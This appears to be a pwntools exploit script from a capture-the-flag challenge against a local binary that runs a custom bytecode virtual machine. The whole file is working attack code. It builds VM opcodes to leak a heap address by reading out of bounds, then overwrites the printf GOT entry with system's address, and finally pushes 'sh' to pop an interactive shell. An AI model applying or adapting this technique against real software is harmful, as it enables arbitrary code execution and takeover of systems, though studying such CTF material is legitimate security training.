#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x8048F54
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendafter("4.exit\n>>> ",str(idx).ljust(9,'\x00'))
def new(payload):
    menu(1)
    a.send(payload)
def run():
    menu(2)

def Pop(idx):
    return "\x80"+p8(idx)
def PushReg(idx):
    return "\x70"+p8(idx)
def Push(value):
    return "\x73"+p32(value)
def Show():
    return "\x10\x01"
def AddReg(idx1,idx2):
    return "\x40"+p8(idx1)+p8(idx2)
def Add(idx1,value):
    return "\x43"+p8(idx1)+p32(value)
def SubReg(idx1,idx2):
    return "\x50"+p8(idx1)+p8(idx2)
def Sub(idx,value):
    return "\x53"+p8(idx)+p32(value)
def Mov(idx,value):
    return "\x05"+p8(idx)+p32(value)
def Exit():
    return "\xb0"
free_got = 0x804B018

payload = AddReg(3,8) # reg[3] = 0x093d1140
payload += Sub(3,0x120) #reg[3] = 0x093d1120
payload += Show()
for i in range(3):
    payload+=Add(3,1)
    payload+=Show()
payload+='\xb0'
new(payload.ljust(0x1FF,'\x00'))
run()
heap_base = u32(a.recvuntil("1.new",drop=True))-0x134
fuck(heap_base)
target_addr = heap_base+0x0804c474-0x804c000
offset = target_addr-0x804B014
payload = Sub(6,offset)#SP = printf_got
payload += Pop(0)
payload += Sub(0,libc.symbols["printf"]-libc.symbols["system"])
payload += Pop(1)
payload += PushReg(0)
payload += Exit()
new(payload.ljust(0x1ff,'\x00'))
run()
payload=""
for i in range(62):
    payload+=Push(0)
payload+=Push(u32("sh\x00\x00"))
payload += Exit()
new(payload.ljust(0x1ff,'\x00'))
run()
menu(3)
a.interactive()








